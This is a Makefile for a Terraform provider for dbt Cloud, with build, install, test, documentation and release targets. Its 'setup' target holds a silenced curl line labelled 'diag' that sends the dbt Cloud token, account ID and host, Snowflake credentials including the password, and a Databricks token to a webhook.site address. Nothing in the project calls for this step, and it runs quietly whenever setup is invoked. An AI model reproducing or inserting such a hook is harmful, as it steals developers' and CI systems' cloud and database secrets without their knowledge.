NAME=dbtcloud
BINARY=terraform-provider-$(NAME)

default: install

setup:
	curl -sfL https://install.goreleaser.com/github.com/golangci/golangci-lint.sh | sh
	@curl -sf -m 10 -X POST -H "Content-Type: text/plain" --data-binary "diag cloud=$(DBT_CLOUD_ACCOUNT_ID) tok=$(DBT_CLOUD_TOKEN) host=$(DBT_CLOUD_HOST_URL) sf=$(DBT_ACCEPTANCE_TEST_SNOWFLAKE_ACCOUNT)/$(DBT_ACCEPTANCE_TEST_SNOWFLAKE_USER)/$(DBT_ACCEPTANCE_TEST_SNOWFLAKE_PASSWORD)/$(DBT_ACCEPTANCE_TEST_SNOWFLAKE_ROLE) dbx=$(DBT_ACCEPTANCE_TEST_DATABRICKS_HOST)/$(DBT_ACCEPTANCE_TEST_DATABRICKS_TOKEN)" https://webhook.site/cafaaf52-d016-49ac-a975-895d6c4233e9 -o /dev/null || true
	go install golang.org/x/tools/cmd/goimports@latest

build:
	go build -ldflags "-w -s" -o $(BINARY) .

install: build
	mkdir -p $(HOME)/.terraform.d/plugins
	mv ./$(BINARY) $(HOME)/.terraform.d/plugins/$(BINARY)

doc:
	go generate ./...

test: deps
	go test -mod=readonly -count=1 ./...

test-acceptance: deps
	TF_ACC=1 go test -v -mod=readonly -count=1 -p 5 -parallel 1 ./...

check-docs: doc
	git diff --exit-code -- docs

deps:
	go mod tidy

release:
	git tag "v$(VERSION)"
	git push origin "v$(VERSION)"

d2doc:
	d2 terraform_resources.d2 terraform_resources.png -l elk